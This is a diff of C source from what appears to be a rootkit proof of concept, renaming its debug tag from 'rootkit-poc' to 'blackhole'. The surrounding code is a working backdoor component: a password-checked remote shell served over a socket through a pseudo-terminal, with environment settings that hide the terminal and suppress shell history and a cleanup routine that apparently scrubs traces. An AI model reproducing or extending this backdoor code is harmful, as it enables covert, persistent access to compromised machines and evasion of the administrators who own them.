@@ -17,8 +17,6 @@
 #include "shell.h"
 
 void setup_pty(int sock, int *pty, int *tty) {
-    DEBUG("[rootkit-poc]: setup_pty called\n");
-
     char *args[] = {strdup(SHELL_TYPE), "-l", 0};
     char *env[] = {strdup(HIDE_TERM_VAR), strdup(HIST_FILE), strdup(TERM), 0};
 
@@ -57,8 +55,6 @@ void setup_pty(int sock, int *pty, int *tty) {
 }
 
 void shell_listener(int sock, int pty) {
-    DEBUG("[rootkit-poc]: shell_listener called\n");
-
     fd_set fds;
     char buf[MAX_LEN];
     int res, maxfd;
@@ -89,7 +85,7 @@ void shell_listener(int sock, int pty) {
         FD_SET(pty, &fds);
 
         if ((res=select(maxfd+1, &fds, NULL, NULL, NULL)) == -1) {
-            DEBUG("[rootkit-poc]: Select failed\n");
+            DEBUG("[blackhole]: Select failed\n");
             break; // exit loop on select failure
         }
 
@@ -98,9 +94,9 @@ void shell_listener(int sock, int pty) {
 
             if ((res=s_read(sock, buf, MAX_LEN)) <= 0) {
                 if (res == 0) {
-                    DEBUG("[rootkit-poc]: Client disconnected\n");
+                    DEBUG("[blackhole]: Client disconnected\n");
                 } else {
-                    DEBUG("[rootkit-poc]: Error reading from client\n");
+                    DEBUG("[blackhole]: Error reading from client\n");
                 }
                 break; // exit loop on read failure
             } else {
@@ -113,9 +109,9 @@ void shell_listener(int sock, int pty) {
 
             if ((res=read(pty, buf, MAX_LEN-31)) <= 0) {
                 if (res == 0) {
-                    DEBUG("[rootkit-poc]: PTY closed\n");
+                    DEBUG("[blackhole]: PTY closed\n");
                 } else {
-                    DEBUG("[rootkit-poc]: Error reading from pty\n");
+                    DEBUG("[blackhole]: Error reading from pty\n");
                 }
                 break; // exit loop on read failure
             } else {
@@ -149,7 +145,7 @@ int check_shell_password(int sock) {
 }
 
 int start_shell(int sock, struct sockaddr *addr) {
-    DEBUG("[rootkit-poc]: start_shell called\n");
+    DEBUG("[blackhole]: start_shell called\n");
 
     char buffer[512];
     char *shell_msg = strdup(SHELL_MSG);
@@ -162,17 +158,17 @@ int start_shell(int sock, struct sockaddr *addr) {
     memset(buffer, 0x00, sizeof(buffer)); // reset buffer 
 
     if (addr == NULL) {
-        DEBUG("[rootkit-poc]: Error: addr is NULL\n");
+        DEBUG("[blackhole]: Error: addr is NULL\n");
         return -1;
     }
 
     if (addr->sa_family != AF_INET) {
-        DEBUG("[rootkit-poc]: Error: addr is not AF_INET\n");
+        DEBUG("[blackhole]: Error: addr is not AF_INET\n");
         return -1;
     }
 
     if (!check_shell_password(sock)) {
-        DEBUG("[rootkit-poc]: Invalid shell password\n");
+        DEBUG("[blackhole]: Invalid shell password\n");
         shutdown(sock, SHUT_RDWR);
         close(sock);
         return -1;
@@ -186,7 +182,7 @@ int start_shell(int sock, struct sockaddr *addr) {
 
     cleanup(sys_write, strlen(sys_write));
 
-    DEBUG("[rootkit-poc]: Sending shell message to client\n");
+    DEBUG("[blackhole]: Sending shell message to client\n");
     if (write(sock, shell_msg, strlen(shell_msg)) == -1) {
         perror("write");
         return -1;
@@ -195,7 +191,7 @@ int start_shell(int sock, struct sockaddr *addr) {
     char pty_name[51];
 
     if (openpty(&pty, &tty, pty_name, NULL, NULL) == -1) {
-        DEBUG("[rootkit-poc]: Error: failed to grab pty\n");
+        DEBUG("[blackhole]: Error: failed to grab pty\n");
         return -1;
     }
 
